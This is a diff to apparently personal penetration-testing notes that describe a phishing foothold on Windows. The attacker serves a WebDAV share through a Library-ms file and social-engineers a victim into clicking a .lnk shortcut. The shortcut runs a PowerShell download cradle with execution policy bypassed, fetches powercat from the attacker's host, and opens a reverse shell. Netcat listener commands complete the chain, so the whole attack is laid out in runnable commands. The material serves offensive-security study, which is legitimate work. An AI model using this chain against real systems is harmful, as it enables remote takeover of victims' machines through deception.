@@ -9,10 +9,14 @@ In the first stage, we'll use Windows library files to gain a foothold on the ta
 First we need to install and setup a WebDAV share. We are using a WebDAV share over something like a simple http server so that it can be rendered in Windows explorer.
 
 ```bash
+mkdir wsgidav
+cd wsgidav
 wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root $(pwd)
 ```
 
-We will then create the file `config.Library-ms` with the following contents to open the WebDAV share remotely
+We will then create the payload to be sent to the target. It will be a `Library-ms` file that can view our WebDAV share remotely.
+
+**config.Library-ms**
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -36,23 +40,19 @@ We will then create the file `config.Library-ms` with the following contents to 
 </libraryDescription>
 ```
 
-This file will be what we send to the target.
+Next we will create a `.lnk` file that will launch our reverse shell. Because `.lnk` files have restricted character lengths, we will use a powercat cradle.
 
-Next we will create a `.lnk` file that will launch our reverse shell. Because `.lnk` files have restricted character lengths, we will use the following command as opposed to the usual base64 encoded payload. We can use the `PowerShell #3 (Base64)` reverse shell from [revshells](https://www.revshells.com/) and place it in the file `hehe.ps1`.
-
-`hehe.ps1` on attack box
+**automatic_configuration.lnk:**
 
 ```powershell
-powershell -e JABjAGwAaQBlAG4AdAA...
-```
-
-`automatic_configuration.lnk` path for target to click (more details can be found [here](../../11%20Windows/Windows%20Shells.md))
-
-```powershell
-powershell -nop -noni -ep bypass -c "IEX(New-Object System.Net.WebClient).DownloadString('http://OUR_IP:8000/hehe.ps1')"
+powershell -nop -noni -ep bypass -c "IEX(New-Object System.Net.WebClient).DownloadString('http://$OUR_IP:8000/powercat.ps1');powercat -c $OUR_IP -p 445 -e powershell"
 ```
 
 We will now place `automatic_configuration.lnk` in the directory where we are serving our wsgidav web server so that the target can run it after opening `config.Library-ms`
+
+```bash
+mv automatic_configuration.lnk wsgidav
+```
 
 Before sending the `config.Library-ms` file, we can setup our listeners with the following commands in separate terminals
 
@@ -61,7 +61,7 @@ python3 -m http.server
 ```
 
 ```bash
-rlwrap -cAr nc -lvnp 9001
+rlwrap -cAr nc -lvnp 445
 ```
 
 We can then place the `.lnk` within our WebDAV directory, and send `config.Library-ms` to our target and social engineer them into opening `config.Libary-ms` and click on `automatic_configuration.lnk`
